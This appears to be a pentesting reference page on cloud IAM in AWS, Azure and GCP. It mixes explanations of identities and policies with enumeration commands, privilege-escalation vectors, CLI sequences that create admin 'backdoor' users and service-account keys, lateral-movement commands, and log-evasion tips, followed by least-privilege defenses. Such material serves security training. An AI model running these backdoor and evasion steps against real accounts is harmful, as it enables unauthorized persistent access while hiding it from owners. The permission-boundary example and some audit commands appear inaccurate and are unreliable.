#cloud #aws #azure #gcp #iam #identity

Cloud Identity and Access Management (IAM) controls who can do what to which resources. It is the primary attack surface in cloud environments. Misconfigurations in IAM policies and role assignments lead to most cloud breaches.

---

## Cloud IAM Fundamentals

### Three Core Concepts

**Principal:** Who is making the request
- Users (humans)
- Service accounts / managed identities (services)
- Roles (collections of permissions)

**Policy:** What actions are allowed or denied
- Effect: Allow or Deny
- Action: Specific API calls (s3:GetObject, iam:CreateUser, etc.)
- Resource: What the policy applies to (specific bucket, all buckets, etc.)

**Resource:** What is being accessed
- S3 bucket
- Database
- Compute instance
- IAM role itself

---

## AWS IAM

### Identity Types

**IAM Users**
- Human-like identities
- Long-term access keys (never expire by default)
- Can be used to log into AWS console
- **Pentesting:** Finding long-lived keys = persistent access

**IAM Roles**
- Service identities (assumed by EC2, Lambda, etc.)
- Temporary credentials (auto-expiring)
- Can be assumed across accounts
- **Pentesting:** Compromise EC2 → assume role → escalate privileges

**Service Accounts**
- Special identities for services/applications
- Usually have temporary credentials
- Less scrutiny than user accounts

### Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:ListBucket"
    ],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}
```

**Components:**
- **Effect:** Allow or Deny
- **Action:** AWS API calls (service:action format)
- **Resource:** ARN (Amazon Resource Name) or wildcard (*)

### Credential Types

**Long-term (IAM User Keys)**
```
AccessKeyId: AKIAIOSFODNN7EXAMPLE
SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```
Never expire unless manually rotated. High-value target.

**Temporary (Assumed Role)**
```
AccessKeyId: ASIA...
SecretAccessKey: ...
SessionToken: AQoDYXdzEJr...
Expiration: 2026-10-19T18:00:00Z
```
Auto-expiring. Credentials valid for 1-6 hours typically.

---

## Azure IAM (Entra ID)

### Identity Types

**Users**
- Human accounts in Azure AD / Entra ID
- Password-based authentication
- May have MFA

**Service Principals**
- Application identities
- Credentials: certificates or secrets (long-lived)
- Used by services and scripts

**Managed Identities**
- Azure-native service identities (no secrets to manage)
- System-assigned (1:1 with resource)
- User-assigned (shared across resources)

### Role-Based Access Control (RBAC)

```
Role = Permissions
Scope = Where it applies (subscription, resource group, resource)

Assignment: User/Principal + Role + Scope
```

**Common Roles:**
- Owner (full control)
- Contributor (full control except access assignment)
- Reader (read-only)
- Custom roles (define your own)

### Credential Types

**Application Secrets**
```
Client ID: 12345678-1234-1234-1234-123456789012
Client Secret: abc123XYZ~
Tenant ID: abcdef01-2345-6789-abcd-ef0123456789
```
Long-lived. High-value targets when exposed.

**Certificates**
Application authenticates with a certificate instead of a secret.
Still long-lived but rotatable.

**Managed Identities**
No secrets to manage. Azure handles credential lifecycle.

---

## GCP IAM (Cloud IAM)

### Identity Types

**Users**
- Google Cloud identities (user@domain.com)
- Service accounts (service-123@project.iam.gserviceaccount.com)
- Groups (team@domain.com)

### Service Accounts

GCP's core identity model. Each service account has:
- Email address
- Private key (JSON) or public certificate
- Scopes (permissions)

**Key Types:**
- JSON key (private key file)
- P12 key (certificate format)

Both are long-lived and can be used anywhere.

### Role Structure

```
Role = Collection of permissions
Binding = Role + Member (who gets it)
Policy = All bindings on a resource
```

**Predefined Roles:**
- `roles/viewer` - Read-only
- `roles/editor` - Editor (deprecated, prefer specific roles)
- `roles/owner` - Owner (use cautiously)
- Custom roles (define your own)

---

## Privilege Escalation in IAM

### Identifying Escalation Paths

**Enumerate current permissions:**
```bash
# AWS
aws iam get-user
aws iam list-attached-user-policies
aws iam list-inline-user-policies

# Azure
az role assignment list --assignee <user-id>

# GCP
gcloud projects get-iam-policy <project> \
  --flatten="bindings[].members"
```

**Find escalation opportunities:**
1. Can I create an access key? → Persistence
2. Can I assume a higher-privilege role? → Escalation
3. Can I modify policies? → Escalation
4. Can I create users/service accounts? → Backdoor
5. Can I pass a role to a service I control? → Escalation

### Common Escalation Vectors

**PassRole Abuse (AWS)**
```
Permission: iam:PassRole → Lambda:CreateFunction
Attack: Create Lambda with admin role → invoke it
```

**Admin Role on Service Account (Azure/GCP)**
```
Service account assigned Owner role
Attacker compromises compute resource with that identity
Full account compromise
```

**Cross-Account Assumptions (AWS)**
```
Role in Account A can assume Admin role in Account B
Compromise Account A → assume Account B role
```

---

## Post-Compromise IAM Actions

### Create Persistence

**AWS - Create backdoor user:**
```bash
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
aws iam attach-user-policy \
  --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Azure - Create app registration:**
```bash
az ad app create --display-name backdoor
az ad app credential reset --id <app-id>
# Returns credentials for persistent access
```

**GCP - Create service account:**
```bash
gcloud iam service-accounts create backdoor
gcloud iam service-accounts keys create key.json \
  --iam-account backdoor@project.iam.gserviceaccount.com
```

### Lateral Movement

```bash
# AWS: Assume role in different account
aws sts assume-role \
  --role-arn arn:aws:iam::OTHER_ACCOUNT:role/Admin \
  --role-session-name session

# Azure: Get token for different subscription
az account get-access-token \
  --subscription <target-subscription-id>

# GCP: Activate service account
gcloud auth activate-service-account \
  --key-file=key.json
```

---

## Detection & Evasion

### What Gets Logged
- **CloudTrail (AWS):** Every API call, who made it, when, from where
- **Activity Log (Azure):** Resource modifications, role assignments
- **Cloud Audit Logs (GCP):** Admin activity, data access logs

### Detection Signatures
- Creating users/service accounts
- Creating access keys
- Modifying IAM policies
- Assuming roles (especially cross-account)
- Adding permissions to roles

### Evasion
- **Use legitimate tools:** AWS CLI looks like normal AWS usage
- **Enumerate during off-hours:** Less scrutiny
- **Chain actions:** Mix credential creation with normal business logic
- **Assumed roles:** Credentials obtained via role assumption appear to come from that role, not from your user
- **Clean audit logs:** If you have permissions (usually not)

---

## Defense: Principle of Least Privilege

### Role Design
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:GetObject",
      "s3:ListBucket"
    ],
    "Resource": [
      "arn:aws:s3:::app-data",
      "arn:aws:s3:::app-data/*"
    ]
  }]
}
```

NOT:
```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

### Permission Boundaries (AWS)
Prevent escalation by limiting what permissions can be granted:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*",
    "Condition": {
      "StringNotEquals": {
        "iam:PermissionsBoundary": "arn:aws:iam::..."
      }
    }
  }]
}
```

### Regular Audits

**AWS:**
```bash
aws accessanalyzer start-resource-scan
aws iam get-credential-report
```

**Azure:**
```bash
az role assignment list --include-inherited
az identity list-operations
```

**GCP:**
```bash
gcloud projects get-iam-policy <project>
gcloud logging read "resource.type=k8s_cluster"
```

---

## Related Guides
- [[Cloud Metadata Service Attacks]] — obtaining credentials
- [[Cloud Privilege Escalation]] — exploiting IAM misconfigurations
- [[AWS Enumeration]] — enumerating IAM after compromise
- [[Azure Enumeration]] — Azure-specific enumeration
